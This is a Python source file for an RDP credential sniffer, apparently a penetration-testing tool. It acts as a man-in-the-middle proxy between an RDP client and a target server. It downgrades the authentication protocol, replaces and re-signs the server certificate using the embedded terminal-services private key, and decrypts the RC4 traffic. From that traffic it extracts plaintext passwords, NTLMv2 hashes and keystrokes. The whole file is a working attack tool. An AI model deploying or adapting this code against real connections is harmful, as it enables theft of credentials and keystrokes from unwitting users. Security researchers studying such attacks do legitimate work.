#!/usr/bin/env python3
# TODO win7,8,10, server2012, server 2016 matrix
# TODO find an elegant way to parse binary data
"""
RDP Credential Sniffer
Adrian Vollmer, SySS GmbH 2017
"""
# Refs:
#   https://www.contextis.com/resources/blog/rdp-replay/
#   https://msdn.microsoft.com/en-us/library/cc216517.aspx
# Requirements: python3-rsa

import argparse
import socket
import ssl
from binascii import hexlify, unhexlify
import re
import select
import struct
import hashlib
import subprocess

try:
    from hexdump import hexdump
except ImportError:
    print("Warning: The python3 module 'hexdump' is missing.  "
          "Using hexlify instead.")
    def hexdump(x): print(hexlify(x).decode())

parser = argparse.ArgumentParser(
    description="RDP credential sniffer -- Adrian Vollmer, SySS GmbH 2017")
parser.add_argument('-d', '--debug', dest='debug', action="store_true",
    default=False, help="show debug information")
parser.add_argument('-p', '--listen-port', dest='listen_port', type=int,
    default=3389, help="TCP port to listen on (default 3389)")
parser.add_argument('-b', '--bind-ip', dest='bind_ip', type=str, default="",
    help="IP address to bind the fake service to (default all)")
parser.add_argument('-g', '--downgrade', dest='downgrade', type=int,
    default=3, action="store", choices=[0,1,3,11],
    help="downgrade the authentication protocol to this (default 3)")
parser.add_argument('-c', '--certfile', dest='certfile', type=str,
    required=True, help="path to the certificate file")
parser.add_argument('-k', '--keyfile', dest='keyfile', type=str,
    required=True, help="path to the key file")
parser.add_argument('target_host', type=str,
    help="target host of the RDP service")
parser.add_argument('target_port', type=int, default=3389, nargs='?',
    help="TCP port of the target RDP service (default 3389)")

args = parser.parse_args()


TERM_PRIV_KEY = { # little endian, from [MS-RDPBCGR].pdf
    "n": [ 0x3d, 0x3a, 0x5e, 0xbd, 0x72, 0x43, 0x3e, 0xc9, 0x4d, 0xbb, 0xc1,
          0x1e, 0x4a, 0xba, 0x5f, 0xcb, 0x3e, 0x88, 0x20, 0x87, 0xef, 0xf5,
          0xc1, 0xe2, 0xd7, 0xb7, 0x6b, 0x9a, 0xf2, 0x52, 0x45, 0x95, 0xce,
          0x63, 0x65, 0x6b, 0x58, 0x3a, 0xfe, 0xef, 0x7c, 0xe7, 0xbf, 0xfe,
          0x3d, 0xf6, 0x5c, 0x7d, 0x6c, 0x5e, 0x06, 0x09, 0x1a, 0xf5, 0x61,
          0xbb, 0x20, 0x93, 0x09, 0x5f, 0x05, 0x6d, 0xea, 0x87 ],
                      # modulus
    "d": [ 0x87, 0xa7, 0x19, 0x32, 0xda, 0x11, 0x87, 0x55, 0x58, 0x00, 0x16,
          0x16, 0x25, 0x65, 0x68, 0xf8, 0x24, 0x3e, 0xe6, 0xfa, 0xe9, 0x67,
          0x49, 0x94, 0xcf, 0x92, 0xcc, 0x33, 0x99, 0xe8, 0x08, 0x60, 0x17,
          0x9a, 0x12, 0x9f, 0x24, 0xdd, 0xb1, 0x24, 0x99, 0xc7, 0x3a, 0xb8,
          0x0a, 0x7b, 0x0d, 0xdd, 0x35, 0x07, 0x79, 0x17, 0x0b, 0x51, 0x9b,
          0xb3, 0xc7, 0x10, 0x01, 0x13, 0xe7, 0x3f, 0xf3, 0x5f ],
                      # private exponent
    "e": [ 0x5b, 0x7b, 0x88, 0xc0 ] # public exponent
}


# http://www.millisecond.com/support/docs/v5/html/language/scancodes.htm
SCANCODE = {
    0: None,
    1: "ESC", 2: "1", 3: "2", 4: "3", 5: "4", 6: "5", 7: "6", 8: "7", 9:
    "8", 10: "9", 11: "0", 12: "-", 13: "=", 14: "Backspace", 15: "Tab", 16: "Q",
    17: "W", 18: "E", 19: "R", 20: "T", 21: "Y", 22: "U", 23: "I", 24: "O",
    25: "P", 26: "[", 27: "]", 28: "Enter", 29: "CTRL", 30: "A", 31: "S",
    32: "D", 33: "F", 34: "G", 35: "H", 36: "J", 37: "K", 38: "L", 39: ";",
    40: "'", 41: "`", 42: "LShift", 43: "\\", 44: "Z", 45: "X", 46: "C", 47:
    "V", 48: "B", 49: "N", 50: "M", 51: ",", 52: ".", 53: "/", 54: "RShift",
    55: "PrtSc", 56: "Alt", 57: "Space", 58: "Caps", 59: "F1", 60: "F2", 61:
    "F3", 62: "F4", 63: "F5", 64: "F6", 65: "F7", 66: "F8", 67: "F9", 68:
    "F10", 69: "Num", 70: "Scroll", 71: "Home (7)", 72: "Up (8)", 73:
    "PgUp (9)", 74: "-", 75: "Left (4)", 76: "Center (5)", 77: "Right (6)",
    78: "+", 79: "End (1)", 80: "Down (2)", 81: "PgDn (3)", 82: "Ins", 83:
    "Del",
}

crypto = {}

class RC4(object):
    def __init__(self, key):
        x = 0
        self.sbox = list(range(256))
        for i in range(256):
            x = (x + self.sbox[i] + key[i % len(key)]) % 256
            self.sbox[i], self.sbox[x] = self.sbox[x], self.sbox[i]
        self.i = self.j = 0
        self.encrypted_packets = 0


    def decrypt(self, data):
        if self.encrypted_packets >= 4096:
            self.update_key()
        out = []
        for char in data:
            self.i = (self.i + 1) % 256
            self.j = (self.j + self.sbox[self.i]) % 256
            self.sbox[self.i], self.sbox[self.j] = self.sbox[self.j], self.sbox[self.i]
            out.append(char ^ self.sbox[(self.sbox[self.i] + self.sbox[self.j]) % 256])
        self.encrypted_packets += 1
        return bytes(bytearray(out))


    def update_key(self):
        print("Updating session keys")
        pad1 = b"\x36"*40
        pad2 = b"\x5c"*48
        # TODO finish this


def substr(s, offset, count):
    return s[offset:offset+count]


def extract_ntlmv2(bytes, m):
    # References:
    #  - [MS-NLMP].pdf
    #  - https://www.root9b.com/sites/default/files/whitepapers/R9B_blog_003_whitepaper_01.pdf
    offset = len(m.group())//2
    keys = ["lmstruct", "ntstruct", "domain", "user", "workstation",
            "encryption_key"]
    fields = [bytes[offset+i*8:offset+(i+1)*8] for i in range(len(keys))]
    field_offsets = [struct.unpack('<I', x[4:])[0] for x in fields]
    field_lens = [struct.unpack('<H', x[:2])[0] for x in fields]
    payload = bytes[offset+76:]

    values = {}
    for i,length in enumerate(field_lens):
        thisoffset = offset - 12 + field_offsets[i]
        values[keys[i]] = bytes[thisoffset:thisoffset+length]

    global nt_response
    nt_response = values["ntstruct"][:16]
    jtr_string = values["ntstruct"][16:]

    global server_challenge
    if not 'server_challenge' in globals():
        server_challenge = b"SERVER_CHALLENGE_MISSING"

    result = b"%s::%s:%s:%s:%s" % (
                 values["user"].decode('utf-16').encode(),
                 values["domain"].decode('utf-16').encode(),
                 hexlify(server_challenge),
                 hexlify(nt_response),
                 hexlify(jtr_string),
         )

    return result


def extract_server_challenge(bytes, m):
    offset = len(m.group())//2+12
    global server_challenge
    server_challenge = bytes[offset:offset+8]
    return b"Server challenge: " + hexlify(server_challenge)


def extract_server_cert(bytes):
    # Reference: [MS-RDPBCGR].pdf from 2010, v20100305
    m2 = re.match(b".*010c.*030c.*020c", hexlify(bytes))
    offset = len(m2.group())//2
    size = struct.unpack('<H', substr(bytes, offset, 2))[0]
    encryption_method, encryption_level, server_random_len, server_cert_len = (
        struct.unpack('<IIII', substr(bytes, offset+2, 16))
    )
    server_random = substr(bytes, offset+18, server_random_len)
    server_cert = substr(bytes, offset+18+server_random_len,
                         server_cert_len)

    #  cert_version = struct.unpack('<I', server_cert[:4])[0]
        # 1 = Proprietary
        # 2 = x509
        # TODO ignore right most bit

    dwVersion, dwSigAlg, dwKeyAlg = struct.unpack('<III',
                                                  substr(server_cert, 0, 12))

    pubkey_type, pubkey_len = struct.unpack('<HH', substr(server_cert, 12, 4))
    pubkey = substr(server_cert, 16, pubkey_len)
    assert pubkey[:4] == b"RSA1"

    sign_type = struct.unpack('<H', substr(server_cert, 16+pubkey_len, 2))[0]
    sign_len = struct.unpack('<H', substr(server_cert, 18+pubkey_len, 2))[0]
    sign = substr(server_cert, 20+pubkey_len, sign_len)

    key_len, bit_len = struct.unpack('<II', substr(pubkey, 4, 8))
    assert bit_len == key_len * 8 - 64
    data_len, pub_exp = struct.unpack('<II', substr(pubkey, 12, 8))
    modulus = substr(pubkey, 20, key_len)

    first5fields = struct.pack("<IIIHH",
                    dwVersion,
                    dwSigAlg,
                    dwKeyAlg,
                    pubkey_type,
                    pubkey_len )
    global crypto
    crypto.update({"modulus": modulus,
             "pub_exponent": pub_exp,
             "data_len": data_len,
             "server_rand": server_random, # little endian
             "sign": sign,
             "first5fields": first5fields,
             "pubkey_blob": pubkey,
             "client_rand": b"",
    })
    crypto["pubkey"] = {
        "modulus": int.from_bytes(modulus, "little"),
        "publicExponent": pub_exp,
    }
    #  print(crypto)

    return (b"Server cert modulus: " + hexlify(modulus) +
            b"\nSignature: " + hexlify(sign) +
            b"\nServer random: " + hexlify(server_random) )


def extract_client_random(bytes):
    global crypto
    for i in range(7,len(bytes)-4):
        rand_len = bytes[i:i+4]
        if struct.unpack('<I', rand_len)[0] == len(bytes)-i-4:
            client_rand = bytes[i+4:]
            crypto["enc_client_rand"] = client_rand
            client_rand = rsa_decrypt(client_rand, crypto["mykey"])
            crypto["client_rand"] = client_rand
            generate_session_keys()
            return(b"Client random: " + hexlify(client_rand))
    return b""


def reencrypt_client_random(bytes):
    """Replace the original encrypted client random (encrypted with OUR
    public key) with the client random encrypted with the original public
    key"""

    reenc_client_rand = rsa_encrypt(crypto["client_rand"],
                                    crypto["pubkey"]) + b"\x00"*8
    result = bytes.replace(crypto["enc_client_rand"],
                           reenc_client_rand)
    return result


def generate_rsa_key(keysize):
    p = subprocess.Popen(
        ["openssl", "genrsa", str(keysize)],
        stdout=subprocess.PIPE,
        stderr=subprocess.DEVNULL
    )
    key_pipe = subprocess.Popen(
        ["openssl", "rsa", "-noout", "-text"],
        stdin=p.stdout,
        stdout=subprocess.PIPE
    )
    p.stdout.close()
    output = key_pipe.communicate()[0]

        # parse the text output
    key = None
    result = {}
    for line in output.split(b'\n'):
        field = line.split(b':')[:2]
        if len(field) == 2 and field[0] in [
            b'modulus',
            b'privateExponent',
            b'publicExponent'
        ]:
            key = field[0].decode()
            result[key] = field[1]
        elif not line[:1] == b" ":
            key = None
        if line[:4] == b" "*4 and key in result:
            result[key] += line[4:]

    for f in ["modulus", "privateExponent"]:
        b = result[f].replace(b':', b'')
        b = unhexlify(b)
        result[f] = int.from_bytes(b, "big")

    m = re.match(b'.* ([0-9]+) ', result['publicExponent'])
    result['publicExponent'] = int(m.groups(1)[0])
    return result


def rsa_encrypt(bytes, key):
    r = int.from_bytes(bytes, "little")
    e = key["publicExponent"]
    n = key["modulus"]
    c = pow(r, e, n)
    return c.to_bytes(2048, "little").rstrip(b"\x00")


def rsa_decrypt(bytes, key):
    s = int.from_bytes(bytes, "little")
    d = key["privateExponent"]
    n = key["modulus"]
    m = pow(s, d, n)
    return m.to_bytes(2048, "little").rstrip(b"\x00")


def is_fast_path(bytes):
    if len(bytes) <= 1: return False
    return bytes[0] % 4 == 0 and bytes[1] in [len(bytes), 0x80]


def decrypt(bytes, From="Client"):
    cleartext = b""
    if is_fast_path(bytes):
        is_encrypted = (bytes[0] >> 7 == 1)
        has_opt_length = (bytes[1] >= 0x80)
        offset = 2
        if has_opt_length:
            offset += 1
        if is_encrypted:
            offset += 8
            cleartext = rc4_decrypt(bytes[offset:], From=From)
    else: # slow path
        offset = 13
        if len(bytes) <= 15: return bytes
        if bytes[offset] >= 0x80: offset += 1
        offset += 1
        security_flags = struct.unpack('<H', bytes[offset:offset+2])[0]
        is_encrypted = (security_flags & 0x0008)
        if is_encrypted:
            offset += 12
            cleartext = rc4_decrypt(bytes[offset:], From=From)

    if not cleartext == b"":
        if args.debug:
            print("Cleartext: ")
            hexdump(cleartext)
        return bytes[:offset] + cleartext
    else:
        return bytes


def sym_encryption_enabled():
    global crypto
    if "client_rand" in crypto:
        return (not crypto["client_rand"] == b"")
    else:
        return False


def generate_session_keys():
    # Ch. 5.3.5.1
    def salted_hash(s, i):
        global crypto
        sha1 = hashlib.sha1()
        sha1.update(i + s + crypto["client_rand"] +
                    crypto["server_rand"])
        md5 = hashlib.md5()
        md5.update(s + sha1.digest())
        return md5.digest()

    def final_hash(k):
        global crypto
        md5 = hashlib.md5()
        md5.update(k + crypto["client_rand"] +
                   crypto["server_rand"])
        return md5.digest()

    global crypto

    # Non-Fips, 128bit key

    pre_master_secret = (crypto["client_rand"][:24] +
            crypto["server_rand"][:24])
    master_secret = (salted_hash(pre_master_secret, b"A") +
                     salted_hash(pre_master_secret, b"BB") +
                     salted_hash(pre_master_secret, b"CCC"))
    session_key_blob = (salted_hash(master_secret, b"X") +
                        salted_hash(master_secret, b"YY") +
                        salted_hash(master_secret, b"ZZZ"))
    mac_key, server_encrypt_key, server_decrypt_key = [
        session_key_blob[i*16:(i+1)*16] for i in range(3)
    ]
    server_encrypt_key = final_hash(server_encrypt_key)
    server_decrypt_key = final_hash(server_decrypt_key)
    client_encrypt_key = server_decrypt_key
    client_decrypt_key = server_encrypt_key

    crypto["mac_key"] = mac_key
    crypto["server_encrypt_key"] = server_encrypt_key
    crypto["server_decrypt_key"] = server_decrypt_key
    crypto["client_encrypt_key"] = client_encrypt_key
    crypto["client_decrypt_key"] = client_decrypt_key

    # TODO handle shorter keys than 128 bit
    print("Session keys generated")
    init_rc4_sbox()


def init_rc4_sbox():
    print("Initializing RC4 s-box")
    global RC4_CLIENT
    global RC4_SERVER
    global crypto
    RC4_CLIENT = RC4(crypto["server_decrypt_key"])
    RC4_SERVER = RC4(crypto["client_decrypt_key"])


def rc4_decrypt(data, From="Client"):
    global RC4_SBOX_CLIENT
    global RC4_SBOX_SERVER

    if From == "Client":
        return RC4_CLIENT.decrypt(data)
    else:
        return RC4_SERVER.decrypt(data)


def extract_credentials(bytes, m):
    # Client Info PDU
    # "0x0040 MUST be present"
    domlen, userlen, pwlen = [
        struct.unpack('>H', unhexlify(x))[0]
        for x in m.groups()
    ]
    offset = 37
    if domlen + userlen + pwlen < len(bytes):
        domain = substr(bytes, offset, domlen).decode("utf-16")
        user = substr(bytes, offset+domlen+2, userlen).decode("utf-16")
        pw = substr(bytes, offset+domlen+2+userlen+2, pwlen).decode("utf-16")
        return (b"%s\\%s:%s" % (domain.encode(), user.encode(), pw.encode()))
    else:
        return b""


def extract_keyboard_layout(bytes, m):
    length = struct.unpack('<H', unhexlify(m.groups()[0]))[0]
    offset = len(m.group())//2 - length + 8
    global keyboard_info
    keyboard_info = {
        "layout": struct.unpack("<I", substr(bytes, offset, 4))[0],
        "type": struct.unpack("<I", substr(bytes, offset+4, 4))[0],
        "subtype": struct.unpack("<I", substr(bytes, offset+8, 4))[0],
        "funckey": struct.unpack("<I", substr(bytes, offset+12, 4))[0]
    }
    return b"Keyboard layout/type/subtype: 0x%x/0x%x/0x%x" % (
        keyboard_info["layout"],
        keyboard_info["type"],
        keyboard_info["subtype"],
    )


def translate_keycode(key):
    # TODO find key wrt to locale and kbd type
    try:
        return SCANCODE[key]
    except:
        return None


def extract_key_press(bytes):
    result = b""
    if is_fast_path(bytes):
        event = bytes[-2]
        key = bytes[-1]
        key = translate_keycode(key)
        if event %2 == 0 and key:
            result += b"Key press:   %s\n" % key.encode()
        elif event % 2 == 1 and key:
            result += b"Key release:                 %s\n" % key.encode()
        if event > 1 and key:
            result += extract_key_press(
                b"\x44%c%s" % (len(bytes)-2, bytes[2:-2])
            ) + b"\n"
    return result[:-1]


def replace_server_cert(bytes):
    global crypto
    old_sig = sign_certificate(crypto["first5fields"] +
                               crypto["pubkey_blob"])
    assert old_sig == crypto["sign"]
    key_len = len(crypto["modulus"])-8
    crypto["mykey"] = generate_rsa_key(key_len*8)
    new_modulus = crypto["mykey"]["modulus"].to_bytes(key_len + 8, "little")
    old_modulus = crypto["modulus"]
    result = bytes.replace(old_modulus, new_modulus)
    new_pubkey_blob = crypto["pubkey_blob"].replace(old_modulus,
                                                             new_modulus)
    new_sig = sign_certificate(crypto["first5fields"] + new_pubkey_blob)
    result = result.replace(crypto["sign"], new_sig)

    return result


def sign_certificate(cert):
    """Signs the certificate with the private key"""
    m = hashlib.md5()
    m.update(cert)
    m = m.digest() + b"\x00" + b"\xff"*45 + b"\x01"
    m = int.from_bytes(m, "little")
    d = int.from_bytes(TERM_PRIV_KEY["d"], "little")
    n = int.from_bytes(TERM_PRIV_KEY["n"], "little")
    s = pow(m, d, n)
    return s.to_bytes(len(crypto["sign"]), "little")


def parse_rdp(bytes, From="Client"):
    if len(bytes) > 2:
        if bytes[:2] == b"\x03\x00":
            length = struct.unpack('>H', bytes[2:4])[0]
            parse_rdp_packet(bytes[:length], From=From)
            parse_rdp(bytes[length:], From=From)
        elif bytes[0] == 0x30:
            length = bytes[1]
            pad = 2
            if length >= 0x80:
                length_bytes = length - 0x80
                length = int.from_bytes(bytes[2:2+length_bytes], byteorder='big')
                pad = 2 + length_bytes
            parse_rdp_packet(bytes[:length+pad], From=From)
            parse_rdp(bytes[length+pad:], From=From)
        elif bytes[0] % 4 == 0: #fastpath
            length = bytes[1]
            if length >= 0x80:
                length = struct.unpack('>H', bytes[1:3])[0]
                length -= 0x80*0x100
            parse_rdp_packet(bytes[:length], From=From)
            parse_rdp(bytes[length:], From=From)


def parse_rdp_packet(bytes, From="Client"):

    if len(bytes) < 4: return b""

    if sym_encryption_enabled():
        bytes = decrypt(bytes, From=From)

    result = b""
    # hexlify first because \x0a is a line break and regex works on single
    # lines

    # "0x0040 MUST be present"
    regex = b".{30}40.{20}(.{4})(.{4})(.{4})"
    m = re.match(regex, hexlify(bytes))
    if m:
        try:
            result = extract_credentials(bytes, m)
        except:
            result = b""
        #  close();exit(0)

    regex = b".*%s0002000000" % hexlify(b"NTLMSSP")
    m = re.match(regex, hexlify(bytes))
    if m:
        result = extract_server_challenge(bytes, m)

    regex = b".*%s0003000000" % hexlify(b"NTLMSSP")
    m = re.match(regex, hexlify(bytes))
    if m:
        result = extract_ntlmv2(bytes, m)

    global crypto
    if "client_rand" in crypto:
        regex = b".{14,}01.*0{16}"
        m = re.match(regex, hexlify(bytes))
        if m and crypto["client_rand"] == b"":
            result = extract_client_random(bytes)

    regex = b".*020c.*%s" % hexlify(b"RSA1")
    m = re.match(regex, hexlify(bytes))
    if m:
        result = extract_server_cert(bytes)

    regex = b".*0d00(.{4}).{164}0000" ## TODO
    m = re.match(regex, hexlify(bytes))
    if m and From == "Client":
        # A parsing error here shouldn't be a show stopper, so catch exceptions
        try:
            result = extract_keyboard_layout(bytes, m)
        except:
            print("Failed to extract keyboard layout information")

    if len(bytes)>3 and bytes[-2] in [0,1,2,3] and result == b"":
        result = extract_key_press(bytes)


    regex = b"0300.*000300080005000000$"
    m = re.match(regex, hexlify(bytes))
    if m:
        print("Server enforces NLA. Try your luck with the hash.")
        exit(1)

    if not result == b"" and not result == None:
        print("\033[31m%s\033[0m" % result.decode())


def tamper_data(bytes, From="Client"):
    result = bytes

    global crypto
    if "client_rand" in crypto:
        regex = b".{14,}01.*0{16}"
        m = re.match(regex, hexlify(bytes))
        if m and not crypto["client_rand"] == b"":
            result = reencrypt_client_random(bytes)

    regex = b".*020c.*%s" % hexlify(b"RSA1")
    m = re.match(regex, hexlify(bytes))
    if m:
        result = replace_server_cert(bytes)

    regex = b".*%s..010c" % hexlify(b"McDn")
    m = re.match(regex, hexlify(bytes))
    if m:
        result = set_fake_requested_protocol(bytes, m)


    global nt_response
    if "nt_response" in globals():
        global RDP_PROTOCOL
        regex = b".*%s0003000000.*%s" % (
            hexlify(b"NTLMSSP"),
            hexlify(nt_response)
        )
        m = re.match(regex, hexlify(bytes))
        if m and RDP_PROTOCOL > 2:
            result = tamper_nt_response(bytes)

    global server_challenge
    if (From == "Server"
        and "server_challenge" in globals()
       ):
        regex = b"30..a0.*6d"
        m = re.match(regex, hexlify(bytes))
        if m:
            print("Downgrading CredSSP")
            result = unhexlify(b"300da003020104a4060204c000005e")


    if not result == bytes and args.debug:
        dump_data(result, From=From, Modified=True)

    return result


def tamper_nt_response(data):
    """The connection is sometimes terminated if NTLM is successful, this prevents that"""
    print("Tamper with NTLM response")
    global nt_response
    fake_response = bytes([(nt_response[0] + 1 ) % 0xFF]) + nt_response[1:]
    return data.replace(nt_response, fake_response)


def set_fake_requested_protocol(data, m):
    print("Hiding forged protocol request from client")
    offset = len(m.group())//2
    result = data[:offset+6] + bytes([RDP_PROTOCOL_OLD]) + data[offset+7:]
    return result


def downgrade_auth(bytes):
    regex = b".*..00..00.{8}$"
    m = re.match(regex, hexlify(bytes))
    global RDP_PROTOCOL
    global RDP_PROTOCOL_OLD
    RDP_PROTOCOL = RDP_PROTOCOL_OLD = bytes[-4]
    # Flags:
    # 0: standard rdp security
    # 1: TLS instead
    # 2: CredSSP (NTLMv2 or Kerberos)
    # 8: Early User Authorization
    if m and RDP_PROTOCOL > args.downgrade:
        print("Downgrading authentication options from %d to %d" %
              (RDP_PROTOCOL, args.downgrade))
        RDP_PROTOCOL = args.downgrade
        result = (
            bytes[:-7] +
            b"\x00\x08\x00" +
            chr(RDP_PROTOCOL).encode() +
            b"\x00\x00\x00"
        )
        dump_data(result, From="Client", Modified=True)
        return result
    return bytes


def dump_data(data, From=None, Modified=False):
    if args.debug:
        modified = ""
        if Modified:
            modified = " (modified)"
        if From == "Server":
            print("From server:"+modified)
        elif From == "Client":
            print("From client:"+modified)

        hexdump(data)


def handle_protocol_negotiation():
    data = local_conn.recv(4096)
    dump_data(data, From="Client")
    data = downgrade_auth(data)
    remote_socket.send(data)

    data = remote_socket.recv(4096)
    dump_data(data, From="Server")
    local_conn.send(data)


def enableSSL():
    global local_conn
    global remote_socket
    print("Enable SSL")
    try:
        local_conn  = ssl.wrap_socket(
            local_conn,
            server_side=True,
            keyfile=args.keyfile,
            certfile=args.certfile,
        )
        try:
            remote_socket = ssl.wrap_socket(remote_socket, ciphers="RC4-SHA")
        except SSLError:
            remote_socket = ssl.wrap_socket(remote_socket, ciphers=None)
    except (ConnectionResetError):
        print("Connection lost")
    except (ssl.SSLEOFError):
        print("SSL EOF Error during handshake")


def close():
    if "local_conn" in globals():
        local_conn.close()
    if "remote_conn" in globals():
        remote_socket.close()
    return False


def read_data(sock):
    data = sock.recv(4096)
    if len(data) == 4096:
        while len(data)%4096 == 0:
            data += sock.recv(4096)
    return data


def forward_data():
    readable, _, _ = select.select([local_conn, remote_socket], [], [])
    for s_in in readable:
        if s_in == local_conn:
            From = "Client"
            to_socket = remote_socket
        elif s_in == remote_socket:
            From = "Server"
            to_socket = local_conn
        try:
            data = read_data(s_in)
        except ssl.SSLError as e:
            if "alert access denied" in str(e):
                print("TLS alert access denied, Downgrading CredSSP")
                local_conn.send(unhexlify(b"300da003020104a4060204c000005e"))
                return False
            elif "alert internal error" in str(e):
                # openssl connecting to windows7 with AES doesn't seem to
                # work
                print("TLS alert internal error received, make sure to use RC4-SHA")
                return False
            else:
                raise
        if data == b"": return close()
        dump_data(data, From=From)
        parse_rdp(data, From=From)
        data = tamper_data(data, From=From)
        to_socket.send(data)
    return True


def open_sockets():
    global local_conn
    global remote_socket
    print("Waiting for connection")
    local_conn, addr = local_socket.accept()
    print("Connection received from " + addr[0])

    remote_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    remote_socket.connect((args.target_host, args.target_port))


def run():
    open_sockets()
    handle_protocol_negotiation()
    if not RDP_PROTOCOL == 0:
        enableSSL()
    while True:
        try:
            if not forward_data():
                break
        except (ssl.SSLError, ssl.SSLEOFError) as e:
            print("SSLError: %s" % str(e))
        except (ConnectionResetError, OSError):
            print("Connection lost")


local_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
local_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
local_socket.bind((args.bind_ip, args.listen_port))
local_socket.listen()

try:
    while True:
        run()
except KeyboardInterrupt:
    pass
finally:
    local_socket.close()
